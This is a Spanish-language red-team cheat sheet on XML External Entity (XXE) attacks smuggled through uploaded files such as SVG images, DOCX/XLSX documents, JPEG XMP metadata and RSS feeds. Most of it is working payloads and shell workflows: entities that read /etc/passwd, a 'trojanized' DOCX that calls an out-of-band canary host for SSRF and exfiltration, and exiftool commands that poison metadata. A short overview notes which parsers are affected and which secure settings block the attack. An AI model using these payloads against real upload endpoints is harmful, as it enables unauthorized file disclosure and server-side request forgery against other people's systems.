---
aliases:
tags:
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[XML External Entity (XXE)]]"
---
# XXE - Carga de Archivos (Formatos XML Ocultos)

***

## Cheatsheet

| **Comando / Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subir SVG con `<?xml ...?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg ...><text>&xxe;</text></svg>` | Texto renderizado del archivo en imagen output | Avatar/thumbnail que renderiza SVG (ImageMagick, librsvg). |
| `unzip doc.docx && sed -i 's|<?xml version="1.0"|<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://CANARY">]><r>\&x;|' word/document.xml && zip -r poison.docx .` | DOCX trojanizado para SSRF/exfil al procesar | Backend parsea DOCX (Apache POI, python-docx, LibreOffice headless). |
| Mismo procedimiento sobre `xl/workbook.xml` dentro de un `.xlsx` | XLSX malicioso | Backend acepta upload de planillas. |
| `exiftool -xmp:title='<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;' image.jpg` | JPEG con metadata XMP envenenada | Backend lee XMP con parser XML vulnerable (ExifTool antiguo, ImageMagick). |
| Subir `.wsdl` o `.xml` directamente con payload XXE | Exfil/SSRF en endpoints SOAP/import | Endpoint acepta WSDL/XML schema upload (import features). |
| `.rss`/`.atom` con `<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | LFI/SSRF al parsear feed | Backend feed importer (RSS-to-blog, podcast importer). |
^xxe-carga-archivos

### SVG con XXE (payload completo)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="0" y="20" font-size="14">&xxe;</text>
</svg>
```

### DOCX trojanizado — workflow

```bash
# 1. Descomprimir un .docx legítimo
cp legit.docx poison.docx && cd /tmp/poison && unzip ../poison.docx

# 2. Inyectar DOCTYPE en [Content_Types].xml o word/document.xml
# Antes:  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
# Después:
cat > word/document.xml.new <<'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "http://CANARY.oast.fun/docx-probe">]>
EOF
tail -n +2 word/document.xml >> word/document.xml.new
mv word/document.xml.new word/document.xml

# 3. Reempaquetar (NO usar 'zip -r' con compresión por default — preservar estructura)
zip -r ../poison.docx . -x "*.DS_Store"

# 4. Subir → verificar callback en Collaborator
```

### XMP en JPG con exiftool

```bash
exiftool \
  -xmp:title='<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;' \
  -overwrite_original photo.jpg
file photo.jpg  # sigue siendo JPEG válido
# Subir a backend que extrae XMP
```

___

## Overview

Aplicaciones que aceptan archivos "no-XML" en superficie pero los procesan con parsers XML internamente son vulnerables:

- **SVG** — XML puro. Renderers como ImageMagick (`+convert`), librsvg, batik resuelven entities si la versión es antigua.
- **DOCX/XLSX/PPTX (Office Open XML)** — zip + múltiples XML internos. Backends que extraen texto, generan previews, o procesan metadata son vulnerables.
- **XMP en JPEG/PNG/GIF** — metadata embebida basada en RDF/XML. ExifTool legacy, ImageMagick, librerías de "smart cropping" pueden parsearla.
- **WSDL/XSD/RSS/Atom** — import-from-URL features los pasan por parsers XML.
- **`.xml`/`.wsdl` directos** — formularios de import legítimos.

### Por qué frecuentemente Blind

La mayoría de estos endpoints **no devuelven el resultado del parse** — sólo "Upload OK". La técnica viable es [[XXE - Out-of-Band (OOB) y DTDs Externos]] con Collaborator, o SVG renderizado a PNG (in-band si el output incluye el texto extraído).

### Limitaciones

- **Strict parsers:** procesos modernos (Java con `XMLConstants.FEATURE_SECURE_PROCESSING=true`, .NET con `DtdProcessing=Prohibit`) ignoran el `DOCTYPE`.
- **No-parse storage:** si el archivo se guarda en S3/disk sin procesar → no hay vector. Confirmar que el backend efectivamente abre y parsea.
- **Zip estructura:** DOCX/XLSX necesitan que `[Content_Types].xml` no rompa la spec OOXML — modificar sin tocar relationships.

***
